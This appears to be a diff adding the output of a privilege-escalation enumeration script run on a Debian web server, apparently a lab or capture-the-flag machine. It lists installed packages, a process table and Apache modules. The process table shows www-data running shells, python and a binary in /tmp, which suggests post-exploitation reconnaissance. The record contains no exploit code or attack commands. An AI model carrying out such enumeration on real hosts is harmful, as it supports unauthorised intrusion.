+    liberror-perl 0.17027-2  Perl module for error/exception handling in an OO-ish way
+    libestr0:amd64 0.1.10-2.1  Helper functions for handling strings (lib)
+    libevent-2.1-6:amd64 2.1.8-stable-4  Asynchronous event notification library
+    libexpat1:amd64 2.2.6-2+deb10u1  XML parsing C library - runtime library
+    libext2fs2:amd64 1.44.5-1+deb10u2  ext2/ext3/ext4 file system libraries
+    libfastjson4:amd64 0.99.8-2  fast json library for C
+    libfcgi-perl 0.78-2+b3  helper module for FastCGI
+    libfdisk1:amd64 2.33.1-0.1  fdisk partitioning library
+    libffi6:amd64 3.2.1-9  Foreign Function Interface library runtime
+    libfl2:amd64 2.6.4-6.2  SHARED library for flex (a fast lexical analyzer generator)
+    libflac8:amd64 1.3.2-3  Free Lossless Audio Codec - runtime C library
+    libfluidsynth1:amd64 1.1.11-1  Real-time MIDI software synthesizer (runtime library)
+    libfontenc1:amd64 1:1.1.3-1+b2  X11 font encoding library
+    libfreetype6:amd64 2.9.1-3  FreeType 2 font engine, shared library files
+    libfribidi0:amd64 1.0.5-3.1+deb10u1  Free Implementation of the Unicode BiDi algorithm
+    libfstrm0:amd64 0.4.0-1  Frame Streams (fstrm) library
+    libfuse2:amd64 2.9.9-1  Filesystem in Userspace (library)
+    libgc1c2:amd64 1:7.6.4-0.4  conservative garbage collector for C and C++
+    libgcc1:amd64 1:8.3.0-6  GCC support library
+    libgcrypt20:amd64 1.8.4-5  LGPL Crypto library - runtime library
+    libgdbm-compat4:amd64 1.18.1-4  GNU dbm database routines (legacy support runtime version)
+    libgdbm6:amd64 1.18.1-4  GNU dbm database routines (runtime version)
+    libgeoip1:amd64 1.6.12-1  non-DNS IP-to-country resolver library
+    libgfortran5:amd64 8.3.0-6  Runtime library for GNU Fortran applications
+    libglib2.0-0:amd64 2.58.3-2+deb10u2  GLib library of C routines
+    libglib2.0-data 2.58.3-2+deb10u2  Common files for GLib library
+    libgmp10:amd64 2:6.1.2+dfsg-4  Multiprecision arithmetic library
+    libgnutls-dane0:amd64 3.6.7-4  GNU TLS library - DANE security support
+    libgnutls30:amd64 3.6.7-4  GNU TLS library - main runtime library
+    libgpg-error0:amd64 1.35-1  GnuPG development runtime library
+    libgpm2:amd64 1.20.7-5  General Purpose Mouse - shared library
+    libgsasl7 1.8.0-8+b2  GNU SASL library
+    libgssapi-krb5-2:amd64 1.17-3  MIT Kerberos runtime libraries - krb5 GSS-API Mechanism
+    libhogweed4:amd64 3.4.1-1  low level cryptographic library (public-key cryptos)
+    libhtml-parser-perl 3.72-3+b3  collection of modules that parse HTML text documents
+    libhtml-tagset-perl 3.20-3  Data tables pertaining to HTML
+    libhtml-template-perl 2.97-1  module for using HTML templates with Perl
+    libhttp-date-perl 6.02-1  module of date conversion routines
+    libhttp-message-perl 6.18-1  perl interface to HTTP style messages
+    libice6:amd64 2:1.0.9-2  X11 Inter-Client Exchange library
+    libicu63:amd64 63.1-6  International Components for Unicode
+    libidn11:amd64 1.33-2.2  GNU Libidn library, implementation of IETF IDN specifications
+    libidn2-0:amd64 2.0.5-1  Internationalized domain names (IDNA2008/TR46) library
+    libio-html-perl 1.001-1  open an HTML file with automatic charset detection
+    libio-pty-perl 1:1.08-1.1+b5  Perl module for pseudo tty IO
+    libip4tc0:amd64 1.8.2-4  netfilter libip4tc library
+    libip6tc0:amd64 1.8.2-4  netfilter libip6tc library
+    libiptc0:amd64 1.8.2-4  netfilter libiptc library
+    libisc-export1100:amd64 1:9.11.5.P4+dfsg-5.1  Exported ISC Shared Library
+    libisc1100:amd64 1:9.11.5.P4+dfsg-5.1  ISC Shared Library used by BIND
+    libisccc161:amd64 1:9.11.5.P4+dfsg-5.1  Command Channel Library used by BIND
+    libisccfg163:amd64 1:9.11.5.P4+dfsg-5.1  Config File Handling Library used by BIND
+    libjack-jackd2-0:amd64 1.9.12~dfsg-2  JACK Audio Connection Kit (libraries)
+    libjansson4:amd64 2.12-1  C library for encoding, decoding and manipulating JSON data
+    libjbig0:amd64 2.1-3.1+b2  JBIGkit libraries
+    libjpeg62-turbo:amd64 1:1.5.2-2+b1  libjpeg-turbo JPEG runtime library
+    libjson-c3:amd64 0.12.1+ds-2  JSON manipulation library - shared library
+    libk5crypto3:amd64 1.17-3  MIT Kerberos runtime libraries - Crypto Library
+    libkeyutils1:amd64 1.6-6  Linux Key Management Utilities (library)
+    libklibc:amd64 2.0.6-1  minimal libc subset for use with initramfs
+    libkmod2:amd64 26-1  libkmod shared library
+    libkrb5-3:amd64 1.17-3  MIT Kerberos runtime libraries
+    libkrb5support0:amd64 1.17-3  MIT Kerberos runtime libraries - Support library
+    libkyotocabinet16v5:amd64 1.2.76-4.2+b1  Straightforward implementation of DBM - shared library
+    libldap-2.4-2:amd64 2.4.47+dfsg-3+deb10u1  OpenLDAP libraries
+    libldap-common 2.4.47+dfsg-3+deb10u1  OpenLDAP common files for libraries
+    liblmdb0:amd64 0.9.22-1  Lightning Memory-Mapped Database shared library
+    liblocale-gettext-perl 1.07-3+b4  module using libc functions for internationalization in Perl
+    liblockfile-bin 1.14-1.1  support binaries for and cli utilities based on liblockfile
+    liblockfile1:amd64 1.14-1.1  NFS-safe locking library
+    liblognorm5:amd64 2.0.5-1  log normalizing library
+    libltdl7:amd64 2.4.6-9  System independent dlopen wrapper for GNU libtool
+    liblua5.1-0:amd64 5.1.5-8.1+b2  Shared library for the Lua interpreter version 5.1
+    liblua5.2-0:amd64 5.2.4-1.1+b2  Shared library for the Lua interpreter version 5.2
+    liblwp-mediatypes-perl 6.02-1  module to guess media type for a file or a URL
+    liblwres161:amd64 1:9.11.5.P4+dfsg-5.1  Lightweight Resolver Library used by BIND
+    liblz4-1:amd64 1.8.3-1  Fast LZ compression algorithm library - runtime
+    liblzma5:amd64 5.2.4-1  XZ-format compression library
+    liblzo2-2:amd64 2.10-0.1  data compression library
+    libmad0:amd64 0.15.1b-10  MPEG audio decoder library
+    libmagic-mgc 1:5.35-4+deb10u1  File type determination library using "magic" numbers (compiled magic file)
+    libmagic1:amd64 1:5.35-4+deb10u1  Recognize the type of data in a file using "magic" numbers - library
+    libmailutils5:amd64 1:3.5-3  GNU Mail abstraction library
+    libmariadb3:amd64 1:10.3.17-0+deb10u1  MariaDB database client library
+    libmikmod3:amd64 3.3.11.1-4  Portable sound library
+    libmnl0:amd64 1.0.4-2  minimalistic Netlink communication library
+    libmount1:amd64 2.33.1-0.1  device mounting library
+    libmpdec2:amd64 2.4.2-2  library for decimal floating point arithmetic (runtime library)
+    libmpfr6:amd64 4.0.2-1  multiple precision floating-point computation
+    libncurses6:amd64 6.1+20181013-2+deb10u1  shared libraries for terminal handling
+    libncursesw6:amd64 6.1+20181013-2+deb10u1  shared libraries for terminal handling (wide character support)
+    libnet-ssleay-perl 1.85-2+b1  Perl module for Secure Sockets Layer (SSL)
+    libnetfilter-conntrack3:amd64 1.0.7-1  Netfilter netlink-conntrack library
+    libnettle6:amd64 3.4.1-1  low level cryptographic library (symmetric and one-way cryptos)
+    libnewt0.52:amd64 0.52.20-8  Not Erik's Windowing Toolkit - text mode windowing with slang
+    libnfnetlink0:amd64 1.0.1-3+b1  Netfilter netlink library
+    libnftnl11:amd64 1.1.2-2  Netfilter nftables userspace API library
+    libnghttp2-14:amd64 1.36.0-2+deb10u1  library implementing HTTP/2 protocol (shared library)
+    libnss-systemd:amd64 241-7~deb10u1  nss module providing dynamic user and group name resolution
+    libntlm0:amd64 1.5-1  NTLM authentication library
+    libogg0:amd64 1.3.2-1+b1  Ogg bitstream library
+    libopenal-data 1:1.19.1-1  Software implementation of the OpenAL audio API (data files)
+    libopenal1:amd64 1:1.19.1-1  Software implementation of the OpenAL audio API (shared library)
+    libopus0:amd64 1.3-1  Opus codec runtime library
+    libp11-kit0:amd64 0.23.15-2  library for loading and coordinating access to PKCS#11 modules - runtime
+    libpam-modules:amd64 1.3.1-5  Pluggable Authentication Modules for PAM
+    libpam-modules-bin 1.3.1-5  Pluggable Authentication Modules for PAM - helper binaries
+    libpam-runtime 1.3.1-5  Runtime support for the PAM library
+    libpam-systemd:amd64 241-7~deb10u1  system and service manager - PAM module
+    libpam0g:amd64 1.3.1-5  Pluggable Authentication Modules library
+    libpci3:amd64 1:3.5.2-1  Linux PCI Utilities (shared library)
+    libpcre2-8-0:amd64 10.32-5  New Perl Compatible Regular Expression Library- 8 bit runtime files
+    libpcre3:amd64 2:8.39-12  Old Perl 5 Compatible Regular Expression Library - runtime files
+    libperl5.28:amd64 5.28.1-6  shared Perl library
+    libpipeline1:amd64 1.5.1-2  pipeline manipulation library
+    libpng16-16:amd64 1.6.36-6  PNG library - runtime (version 1.6)
+    libpopt0:amd64 1.16-12  lib for parsing cmdline parameters
+    libprocps7:amd64 2:3.3.15-2  library for accessing process information from /proc
+    libprotobuf-c1:amd64 1.3.1-1+b1  Protocol Buffers C shared library (protobuf-c)
+    libpsl5:amd64 0.20.2-2  Library for Public Suffix List (shared libraries)
+    libpulse0:amd64 12.2-4+deb10u1  PulseAudio client libraries
+    libpython-stdlib:amd64 2.7.16-1  interactive high-level object-oriented language (Python2)
+    libpython2-stdlib:amd64 2.7.16-1  interactive high-level object-oriented language (Python2)
+    libpython2.7:amd64 2.7.16-2+deb10u1  Shared Python runtime library (version 2.7)
+    libpython2.7-minimal:amd64 2.7.16-2+deb10u1  Minimal subset of the Python language (version 2.7)
+    libpython2.7-stdlib:amd64 2.7.16-2+deb10u1  Interactive high-level object-oriented language (standard library, version 2.7)
+    libpython3-stdlib:amd64 3.7.3-1  interactive high-level object-oriented language (default python3 version)
+    libpython3.7-minimal:amd64 3.7.3-2  Minimal subset of the Python language (version 3.7)
+    libpython3.7-stdlib:amd64 3.7.3-2  Interactive high-level object-oriented language (standard library, version 3.7)
+    libquadmath0:amd64 8.3.0-6  GCC Quad-Precision Math Library
+    libreadline5:amd64 5.2+dfsg-3+b13  GNU readline and history libraries, run-time libraries
+    libreadline7:amd64 7.0-5  GNU readline and history libraries, run-time libraries
+    librtmp1:amd64 2.4+20151223.gitfa8646d.1-2  toolkit for RTMP streams (shared library)
+    libsamplerate0:amd64 0.1.9-2  Audio sample rate conversion library
+    libsasl2-2:amd64 2.1.27+dfsg-1+deb10u1  Cyrus SASL - authentication abstraction library
+    libsasl2-modules:amd64 2.1.27+dfsg-1+deb10u1  Cyrus SASL - pluggable authentication modules
+    libsasl2-modules-db:amd64 2.1.27+dfsg-1+deb10u1  Cyrus SASL - pluggable authentication modules (DB)
+    libsdl-image1.2:amd64 1.2.12-10+deb10u1  Image loading library for Simple DirectMedia Layer 1.2, libraries
+    libsdl-mixer1.2:amd64 1.2.12-15  Mixer library for Simple DirectMedia Layer 1.2, libraries
+    libsdl-ttf2.0-0:amd64 2.0.11-6  TrueType Font library for Simple DirectMedia Layer 1.2, libraries
+    libsdl1.2debian:amd64 1.2.15+dfsg2-4  Simple DirectMedia Layer
+    libsdl2-2.0-0:amd64 2.0.9+dfsg1-1  Simple DirectMedia Layer
+    libseccomp2:amd64 2.3.3-4  high level interface to Linux seccomp filter
+    libselinux1:amd64 2.8-1+b1  SELinux runtime shared libraries
+    libsemanage-common 2.8-2  Common files for SELinux policy management libraries
+    libsemanage1:amd64 2.8-2  SELinux policy management library
+    libsepol1:amd64 2.8-1  SELinux library for manipulating binary security policies
+    libsigsegv2:amd64 2.12-2  Library for handling page faults in a portable way
+    libslang2:amd64 2.3.2-2  S-Lang programming library - runtime version
+    libsm6:amd64 2:1.2.3-1  X11 Session Management library
+    libsmartcols1:amd64 2.33.1-0.1  smart column output alignment library
+    libsnappy1v5:amd64 1.1.7-1  fast compression/decompression library
+    libsndfile1:amd64 1.0.28-6  Library for reading/writing audio files
+    libsndio7.0:amd64 1.5.0-3  Small audio and MIDI framework from OpenBSD, runtime libraries
+    libsodium23:amd64 1.0.17-1  Network communication, cryptography and signaturing library
+    libsqlite3-0:amd64 3.27.2-3  SQLite 3 shared library
+    libss2:amd64 1.44.5-1+deb10u2  command-line interface parsing library
+    libssh2-1:amd64 1.8.0-2.1  SSH2 client-side library
+    libssl1.1:amd64 1.1.1d-0+deb10u2  Secure Sockets Layer toolkit - shared libraries
+    libstdc++6:amd64 8.3.0-6  GNU Standard C++ Library v3
+    libsystemd0:amd64 241-7~deb10u1  systemd utility library
+    libtasn1-6:amd64 4.13-3  Manage ASN.1 structures (runtime)
+    libterm-readkey-perl 2.38-1  perl module for simple terminal control
+    libtext-charwidth-perl 0.04-7.1+b1  get display widths of characters on the terminal
+    libtext-iconv-perl 1.7-5+b7  converts between character sets in Perl
+    libtext-wrapi18n-perl 0.06-7.1  internationalized substitute of Text::Wrap
+    libtiff5:amd64 4.0.10-4  Tag Image File Format (TIFF) library
+    libtimedate-perl 2.3000-2  collection of modules to manipulate date/time information
+    libtinfo6:amd64 6.1+20181013-2+deb10u1  shared low-level terminfo library for terminal handling
+    libuchardet0:amd64 0.0.6-3  universal charset detection library - shared library
+    libudev1:amd64 241-7~deb10u1  libudev shared library
+    libunbound8:amd64 1.9.0-2+deb10u1  library implementing DNS resolution and validation
+    libunistring2:amd64 0.9.10-1  Unicode string library for C
+    liburi-perl 1.76-1  module to manipulate and access URI strings
+    libusb-0.1-4:amd64 2:0.1.12-32  userspace USB programming library
+    libusb-1.0-0:amd64 2:1.0.22-2  userspace USB programming library
+    libuuid1:amd64 2.33.1-0.1  Universally Unique ID library
+    libvorbis0a:amd64 1.3.6-2  decoder library for Vorbis General Audio Compression Codec
+    libvorbisenc2:amd64 1.3.6-2  encoder library for Vorbis General Audio Compression Codec
+    libvorbisfile3:amd64 1.3.6-2  high-level API for Vorbis General Audio Compression Codec
+    libwayland-client0:amd64 1.16.0-1  wayland compositor infrastructure - client library
+    libwayland-cursor0:amd64 1.16.0-1  wayland compositor infrastructure - cursor library
+    libwayland-egl1:amd64 1.16.0-1  wayland compositor infrastructure - EGL library
+    libwebp6:amd64 0.6.1-2  Lossy compression of digital photographic images.
+    libwrap0:amd64 7.6.q-28  Wietse Venema's TCP wrappers library
+    libx11-6:amd64 2:1.6.7-1  X11 client-side library
+    libx11-data 2:1.6.7-1  X11 client-side library
+    libx11-xcb1:amd64 2:1.6.7-1  Xlib/XCB interface library
+    libxau6:amd64 1:1.0.8-1+b2  X11 authorisation library
+    libxcb1:amd64 1.13.1-2  X C Binding
+    libxcursor1:amd64 1:1.1.15-2  X cursor management library
+    libxdmcp6:amd64 1:1.1.2-3  X11 Display Manager Control Protocol library
+    libxext6:amd64 2:1.3.3-1+b2  X11 miscellaneous extension library
+    libxfixes3:amd64 1:5.0.3-1  X11 miscellaneous 'fixes' extension library
+    libxi6:amd64 2:1.7.9-1  X11 Input extension library
+    libxinerama1:amd64 2:1.1.4-2  X11 Xinerama extension library
+    libxkbcommon0:amd64 0.8.2-1  library interface to the XKB compiler - shared library
+    libxml2:amd64 2.9.4+dfsg1-7+b3  GNOME XML library
+    libxmuu1:amd64 2:1.1.2-2+b3  X11 miscellaneous micro-utility library
+    libxrandr2:amd64 2:1.5.1-1  X11 RandR extension library
+    libxrender1:amd64 1:0.9.10-1  X Rendering Extension client library
+    libxslt1.1:amd64 1.1.32-2.1~deb10u1  XSLT 1.0 processing library - runtime library
+    libxss1:amd64 1:1.2.3-1  X11 Screen Saver extension library
+    libxtables12:amd64 1.8.2-4  netfilter xtables library
+    libxtst6:amd64 2:1.2.3-1  X11 Testing -- Record extension library
+    libxxf86vm1:amd64 1:1.1.4-1+b2  X11 XFree86 video mode extension library
+    libzstd1:amd64 1.3.8+dfsg-3  fast lossless compression algorithm
+    linux-base 4.6  Linux image base package
+    linux-image-4.19.0-6-amd64 4.19.67-2+deb10u2  Linux 4.19 for 64-bit PCs (signed)
+    linux-image-amd64 4.19+105+deb10u1  Linux for 64-bit PCs (meta-package)
+    locales 2.28-10  GNU C Library: National Language (locale) data [support]
+    login 1:4.5-1.1  system login tools
+    logrotate 3.14.0-4  Log rotation utility
+    lsb-base 10.2019051400  Linux Standard Base init script functionality
+    lsb-release 10.2019051400  Linux Standard Base version reporting utility
+    lsof 4.91+dfsg-1  utility to list open files
+    mailutils 1:3.5-3  GNU mailutils utilities for handling mail
+    mailutils-common 1:3.5-3  Common files for GNU mailutils
+    man-db 2.8.5-2  on-line manual pager
+    manpages 4.16-2  Manual pages about using a GNU/Linux system
+    mariadb-client-10.3 1:10.3.17-0+deb10u1  MariaDB database client binaries
+    mariadb-client-core-10.3 1:10.3.17-0+deb10u1  MariaDB database core client binaries
+    mariadb-common 1:10.3.17-0+deb10u1  MariaDB common metapackage
+    mariadb-server 1:10.3.17-0+deb10u1  MariaDB database server (metapackage depending on the latest version)
+    mariadb-server-10.3 1:10.3.17-0+deb10u1  MariaDB database server binaries
+    mariadb-server-core-10.3 1:10.3.17-0+deb10u1  MariaDB database core server files
+    matanza 0.13+ds1-6  Space ascii war game
+    mawk 1.3.3-17+b3  a pattern scanning and text processing language
+    mime-support 3.62  MIME files 'mime.types' & 'mailcap', and support programs
+    moria 5.7.10+20181022-3  Rogue-like game with an infinite dungeon, also known as umoria
+    mount 2.33.1-0.1  tools for mounting and manipulating filesystems
+    mysql-common 5.8+1.0.5  MySQL database common files, e.g. /etc/mysql/my.cnf
+    nano 3.2-3  small, friendly text editor inspired by Pico
+    ncurses-base 6.1+20181013-2+deb10u1  basic terminal type definitions
+    ncurses-bin 6.1+20181013-2+deb10u1  terminal-related programs and man pages
+    ncurses-term 6.1+20181013-2+deb10u1  additional terminal type definitions
+    netbase 5.6  Basic TCP/IP networking system
+    netfilter-persistent 1.0.11  boot-time loader for netfilter configuration
+    nethack-common 3.6.1-1  dungeon crawl game - common files
+    nethack-console 3.6.1-1  dungeon crawl game - text-based interface
+    netris 0.52-10+b2  free, networked version of T*tris
+    nettoe 1.5.1-2+b2  networked version of Tic Tac Toe (3x3 Grid) for the console
+    ninvaders 0.1.1-3+b3  A space invaders-like game using ncurses
+    nsnake 3.0.1-2+b4  classic snake game on the terminal
+    nudoku 1.0.0-1  ncurses based sudoku games
+    ogamesim 1.18-3  Console Ogame Simulator
+    omega-rpg 1:0.90-pa9-16+b2  text-based roguelike game
+    open-adventure 1.4+git20170917.0.d512384-2  colossal cave adventure, the 1995 430-point version
+    openssh-client 1:7.9p1-10+deb10u1  secure shell (SSH) client, for secure access to remote machines
+    openssh-server 1:7.9p1-10+deb10u1  secure shell (SSH) server, for secure access from remote machines
+    openssh-sftp-server 1:7.9p1-10+deb10u1  secure shell (SSH) sftp server module, for SFTP access from remote machines
+    openssl 1.1.1d-0+deb10u2  Secure Sockets Layer toolkit - cryptographic utility
+    os-prober 1.77  utility to detect other OSes on a set of drives
+    pacman4console 1.3-1+b4  ncurses-based pacman game
+    passwd 1:4.5-1.1  change and administer password and group data
+    patch 2.7.6-3+deb10u1  Apply a diff file to an original
+    pciutils 1:3.5.2-1  Linux PCI Utilities
+    perl 5.28.1-6  Larry Wall's Practical Extraction and Report Language
+    perl-base 5.28.1-6  minimal Perl system
+    perl-modules-5.28 5.28.1-6  Core Perl modules
+    perl-openssl-defaults:amd64 3  version compatibility baseline for Perl OpenSSL packages
+    petris 1.0.1-10+b1  Peter's Tetris - a Tetris(TM) clone
+    php-cli 2:7.3+69  command-line interpreter for the PHP scripting language (default)
+    php-common 2:69  Common files for PHP packages
+    php-mbstring 2:7.3+69  MBSTRING module for PHP [default]
+    php-xml 2:7.3+69  DOM, SimpleXML, WDDX, XML, and XSL module for PHP [default]
+    php7.3-cli 7.3.11-1~deb10u1  command-line interpreter for the PHP scripting language
+    php7.3-common 7.3.11-1~deb10u1  documentation, examples and common module for PHP
+    php7.3-gmp 7.3.11-1~deb10u1  GMP module for PHP
+    php7.3-json 7.3.11-1~deb10u1  JSON module for PHP
+    php7.3-mbstring 7.3.11-1~deb10u1  MBSTRING module for PHP
+    php7.3-mysql 7.3.11-1~deb10u1  MySQL module for PHP
+    php7.3-opcache 7.3.11-1~deb10u1  Zend OpCache module for PHP
+    php7.3-readline 7.3.11-1~deb10u1  readline module for PHP
+    php7.3-xml 7.3.11-1~deb10u1  DOM, SimpleXML, WDDX, XML, and XSL module for PHP
+    piu-piu 1.0-1  Horizontal scroller game in bash for cli.
+    powermgmt-base 1.34  common utils for power management
+    procps 2:3.3.15-2  /proc file system utilities
+    psmisc 23.2-1  utilities that use the proc file system
+    publicsuffix 20190415.1030-1  accurate, machine-readable list of domain name suffixes
+    python 2.7.16-1  interactive high-level object-oriented language (Python2 version)
+    python-apt-common 1.8.4  Python interface to libapt-pkg (locales)
+    python-minimal 2.7.16-1  minimal subset of the Python2 language
+    python2 2.7.16-1  interactive high-level object-oriented language (Python2 version)
+    python2-minimal 2.7.16-1  minimal subset of the Python2 language
+    python2.7 2.7.16-2+deb10u1  Interactive high-level object-oriented language (version 2.7)
+    python2.7-minimal 2.7.16-2+deb10u1  Minimal subset of the Python language (version 2.7)
+    python3 3.7.3-1  interactive high-level object-oriented language (default python3 version)
+    python3-apt 1.8.4  Python 3 interface to libapt-pkg
+    python3-certifi 2018.8.24-1  root certificates for validating SSL certs and verifying TLS hosts (python3)
+    python3-chardet 3.0.4-3  universal character encoding detector for Python3
+    python3-debconf 1.5.71  interact with debconf from Python 3
+    python3-debian 0.1.35  Python 3 modules to work with Debian-related data formats
+    python3-debianbts 2.8.2  Python interface to Debian's Bug Tracking System
+    python3-httplib2 0.11.3-2  comprehensive HTTP client library written for Python3
+    python3-idna 2.6-1  Python IDNA2008 (RFC 5891) handling (Python 3)
+    python3-minimal 3.7.3-1  minimal subset of the Python language (default python3 version)
+    python3-pkg-resources 40.8.0-1  Package Discovery and Resource Access using pkg_resources
+    python3-pycurl 7.43.0.2-0.1  Python bindings to libcurl (Python 3)
+    python3-pysimplesoap 1.16.2-1  simple and lightweight SOAP Library (Python 3)
+    python3-reportbug 7.5.3~deb10u1  Python modules for interacting with bug tracking systems
+    python3-requests 2.21.0-1  elegant and simple HTTP library for Python3, built for human beings
+    python3-six 1.12.0-1  Python 2 and 3 compatibility library (Python 3 interface)
+    python3-urllib3 1.24.1-1  HTTP library with thread-safe connection pooling for Python3
+    python3.7 3.7.3-2  Interactive high-level object-oriented language (version 3.7)
+    python3.7-minimal 3.7.3-2  Minimal subset of the Python language (version 3.7)
+    readline-common 7.0-5  GNU readline and history libraries, common files
+    reportbug 7.5.3~deb10u1  reports bugs in the Debian distribution
+    robotfindskitten 2.7182818.701-1+b1  Zen Simulation of robot finding kitten
+    rsync 3.1.3-6  fast, versatile, remote (and local) file-copying tool
+    rsyslog 8.1901.0-1  reliable system and kernel logging daemon
+    sed 4.7-1  GNU stream editor for filtering/transforming text
+    sensible-utils 0.0.12  Utilities for sensible alternative selection
+    shared-mime-info 1.10-1  FreeDesktop.org shared MIME database and spec
+    slashem 0.0.7E7F3-9+b1  variant of Nethack
+    slashem-common 0.0.7E7F3-9+b1  files common to all slashem-packages
+    socat 1.7.3.2-2  multipurpose relay for bidirectional data transfer
+    ssl-cert 1.0.39  simple debconf wrapper for OpenSSL
+    sudo 1.8.27-1+deb10u1  Provide limited super user privileges to specific users
+    sudoku 1.0.5-2+b3  console based sudoku
+    systemd 241-7~deb10u1  system and service manager
+    systemd-sysv 241-7~deb10u1  system and service manager - SysV links
+    sysvinit-utils 2.93-8  System-V-like utilities
+    tar 1.30+dfsg-6  GNU version of the tar archiving utility
+    task-english 3.53  General English environment
+    task-ssh-server 3.53  SSH server
+    tasksel 3.53  tool for selecting tasks for installation on Debian systems
+    tasksel-data 3.53  official tasks used for installation of Debian systems
+    telnet 0.17-41.2  basic telnet client
+    tetrinet-client 0.11+CVS20070911-2+b2  textmode client for tetrinet, a multiplayer tetris-like game
+    timgm6mb-soundfont 1.3-2  TimGM6mb SoundFont from MuseScore 1.3
+    tint 0.05  Tetris clone for text based terminal
+    tintin++ 2.01.5-2  classic text-based MUD client
+    traceroute 1:2.1.0-2  Traces the route taken by packets over an IPv4/IPv6 network
+    ttf-bitstream-vera 1.10-8  The Bitstream Vera family of free TrueType fonts
+    tzdata 2019c-0+deb10u1  time zone and daylight-saving time data
+    ucf 3.0038+nmu1  Update Configuration File(s): preserve user changes to config files
+    udev 241-7~deb10u1  /dev/ and hotplug management daemon
+    usb.ids 2019.07.27-0+deb10u1  USB ID Repository
+    usbutils 1:010-3  Linux USB utilities
+    util-linux 2.33.1-0.1  miscellaneous system utilities
+    util-linux-locales 2.33.1-0.1  locales files for util-linux
+    vim-common 2:8.1.0875-5  Vi IMproved - Common files
+    vim-tiny 2:8.1.0875-5  Vi IMproved - enhanced vi editor - compact version
+    vitetris 0.57.2-2  Virtual terminal *tris clone
+    wamerican 2018.04.16-1  American English dictionary words for /usr/share/dict
+    webmin 1.920  web-based administration interface for Unix systems
+    wget 1.20.1-1.1  retrieves files from the web
+    whiptail 0.52.20-8  Displays user-friendly dialog boxes from shell scripts
+    x11-common 1:7.7+19  X Window System (X.Org) infrastructure
+    xauth 1:1.0.10-1  X authentication utility
+    xdg-user-dirs 0.17-2  tool to manage well known user directories
+    xfonts-base 1:1.0.5  standard fonts for X
+    xfonts-encodings 1:1.0.4-2  Encodings for X.Org fonts
+    xfonts-utils 1:7.7+6  X Window System font utility programs
+    xkb-data 2.26-2  X Keyboard Extension (XKB) configuration data
+    xxd 2:8.1.0875-5  tool to make (or reverse) a hex dump
+    xz-utils 5.2.4-1  XZ-format compression utilities
+    zivot 20013101-3.1+b3  the game of life, simple console version
+    zlib1g:amd64 1:1.2.11.dfsg-1  compression library - runtime
+[+] Current processes
+    USER PID START TIME COMMAND
+    root 1 20:34 0:00 /sbin/init
+    root 2 20:34 0:00 [kthreadd]
+    root 3 20:34 0:00 [rcu_gp]
+    root 4 20:34 0:00 [rcu_par_gp]
+    root 6 20:34 0:00 [kworker/0:0H-kblockd]
+    root 8 20:34 0:00 [mm_percpu_wq]
+    root 9 20:34 0:00 [ksoftirqd/0]
+    root 10 20:34 0:00 [rcu_sched]
+    root 11 20:34 0:00 [rcu_bh]
+    root 12 20:34 0:00 [migration/0]
+    root 13 20:34 0:01 [kworker/0:1-events]
+    root 14 20:34 0:00 [cpuhp/0]
+    root 15 20:34 0:00 [kdevtmpfs]
+    root 16 20:34 0:00 [netns]
+    root 17 20:34 0:00 [kauditd]
+    root 18 20:34 0:00 [khungtaskd]
+    root 19 20:34 0:00 [oom_reaper]
+    root 20 20:34 0:00 [writeback]
+    root 21 20:34 0:00 [kcompactd0]
+    root 22 20:34 0:00 [ksmd]
+    root 23 20:34 0:00 [khugepaged]
+    root 24 20:34 0:00 [crypto]
+    root 25 20:34 0:00 [kintegrityd]
+    root 26 20:34 0:00 [kblockd]
+    root 27 20:34 0:00 [edac-poller]
+    root 28 20:34 0:00 [devfreq_wq]
+    root 29 20:34 0:00 [watchdogd]
+    root 30 20:34 0:00 [kswapd0]
+    root 48 20:34 0:00 [kthrotld]
+    root 49 20:34 0:00 [ipv6_addrconf]
+    root 50 20:34 0:00 [kworker/u2:1-events_unbound]
+    root 59 20:34 0:00 [kstrp]
+    root 95 20:34 0:00 [kworker/0:2-cgroup_destroy]
+    root 104 20:34 0:00 [ata_sff]
+    root 108 20:34 0:00 [scsi_eh_0]
+    root 109 20:34 0:00 [scsi_eh_1]
+    root 111 20:34 0:00 [scsi_tmf_0]
+    root 112 20:34 0:00 [scsi_tmf_1]
+    root 113 20:34 0:00 [scsi_eh_2]
+    root 115 20:34 0:00 [scsi_tmf_2]
+    root 117 20:34 0:00 [kworker/u2:2-events_unbound]
+    root 153 20:34 0:00 [kworker/0:1H-kblockd]
+    root 181 20:34 0:00 [kworker/u3:0]
+    root 183 20:34 0:00 [jbd2/sda1-8]
+    root 184 20:34 0:00 [ext4-rsv-conver]
+    root 216 20:34 0:00 /lib/systemd/systemd-journald
+    root 233 20:34 0:00 /lib/systemd/systemd-udevd
+    root 287 20:34 0:00 [ttm_swap]
+    systemd+ 325 20:34 0:00 /lib/systemd/systemd-timesyncd
+    root 362 20:34 0:00 /sbin/dhclient
+    root 369 20:34 0:00 /usr/sbin/rsyslogd
+    root 370 20:34 0:00 /usr/sbin/cron
+    root 371 20:34 0:00 /lib/systemd/systemd-logind
+    message+ 378 20:34 0:00 /usr/bin/dbus-daemon
+    root 390 20:34 0:00 /sbin/agetty
+    root 400 20:34 0:00 /usr/sbin/sshd
+    root 432 20:34 0:00 /usr/sbin/apache2
+    www-data 454 20:34 0:00 /usr/sbin/apache2
+    www-data 455 20:34 0:00 /usr/sbin/apache2
+    www-data 456 20:34 0:00 /usr/sbin/apache2
+    www-data 457 20:34 0:00 /usr/sbin/apache2
+    www-data 458 20:34 0:00 /usr/sbin/apache2
+    mysql 480 20:34 0:02 /usr/sbin/mysqld
+    Debian-+ 829 20:34 0:00 /usr/sbin/exim4
+    root 831 20:34 0:00 /usr/bin/perl
+    www-data 995 20:46 0:00 /usr/sbin/apache2
+    www-data 1021 20:54 0:00 /usr/sbin/apache2
+    www-data 1022 20:54 0:00 /usr/sbin/apache2
+    www-data 1023 20:54 0:00 /usr/sbin/apache2
+    www-data 1129 21:18 0:00 sh
+    www-data 1132 21:18 0:00 /tmp/dIlti
+    www-data 1133 21:19 0:00 /bin/sh
+    www-data 1135 21:21 0:00 python
+    www-data 1136 21:21 0:00 /bin/bash
+    www-data 1211 21:56 0:00 python
+    www-data 1288 21:56 0:00 /bin/sh
+    www-data 1289 21:56 0:00 ps
+    www-data 1290 21:56 0:00 awk
+
+[+] Apache Version and Modules
+    Server version: Apache/2.4.38 (Debian)
+    Server built:   2019-10-15T19:53:42
+    Loaded Modules:
+    core_module (static)
+    so_module (static)
+    watchdog_module (static)
+    http_module (static)
+    log_config_module (static)
+    logio_module (static)
+    version_module (static)
+    unixd_module (static)
+    access_compat_module (shared)
